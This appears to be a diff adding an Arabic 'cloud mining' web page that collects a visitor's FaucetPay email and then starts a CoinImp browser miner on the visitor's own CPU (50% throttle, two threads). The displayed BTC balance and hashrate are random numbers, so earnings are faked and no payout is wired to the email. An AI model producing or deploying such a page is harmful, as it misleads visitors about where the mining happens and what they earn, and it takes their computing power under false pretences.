@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تعدين سحابي - FaucetPay</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        input, button {
+            padding: 10px;
+            margin: 10px 0;
+            width: 80%;
+            border-radius: 5px;
+            border: none;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        #mining-stats {
+            display: none;
+            margin-top: 20px;
+        }
+        #hashrate, #balance {
+            font-weight: bold;
+            color: #4CAF50;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 موقع تعدين سحابي</h1>
+        <p>أدخل إيميل FaucetPay لبدء التعدين!</p>
+        
+        <div id="login-section">
+            <input type="email" id="faucetpay-email" placeholder="example@faucetpay.io">
+            <button onclick="startMining()">▶ بدء التعدين</button>
+            <p><small>سيتم تحويل الأرباح تلقائياً إلى FaucetPay</small></p>
+        </div>
+        
+        <div id="mining-stats">
+            <h2>⚡ جاري التعدين...</h2>
+            <p>الرصيد: <span id="balance">0.000000</span> BTC</p>
+            <p>سرعة التعدين: <span id="hashrate">0</span> H/s</p>
+            <button onclick="stopMining()">⏹ إيقاف التعدين</button>
+        </div>
+    </div>
+
+    <!-- CoinImp Mining Script (Replace with your own) -->
+    <script src="https://www.coinimp.com/mining/miner.js?key=YOUR_COINIMP_KEY"></script>
+    <script>
+        let miningInterval;
+        
+        function startMining() {
+            const email = document.getElementById('faucetpay-email').value;
+            if (!email.includes('@') || !email.includes('.')) {
+                alert("⚠ الرجاء إدخال إيميل صحيح!");
+                return;
+            }
+            
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('mining-stats').style.display = 'block';
+            
+            // بدء التعدين (مثال باستخدام CoinImp)
+            if (typeof CoinImp !== 'undefined') {
+                CoinImp.startMining('YOUR_COINIMP_SITE_KEY', {
+                    throttle: 0.5, // استخدام 50% من CPU
+                    threads: 2,    // عدد الثريدات
+                });
+            }
+            
+            // محاكاة تحديث الرصيد (في الواقع، يجب ربطه بـ API)
+            miningInterval = setInterval(() => {
+                document.getElementById('balance').textContent = 
+                    (Math.random() * 0.00001).toFixed(6);
+                document.getElementById('hashrate').textContent = 
+                    (Math.random() * 100).toFixed(2);
+            }, 2000);
+        }
+        
+        function stopMining() {
+            if (typeof CoinImp !== 'undefined') {
+                CoinImp.stopMining();
+            }
+            clearInterval(miningInterval);
+            document.getElementById('login-section').style.display = 'block';
+            document.getElementById('mining-stats').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
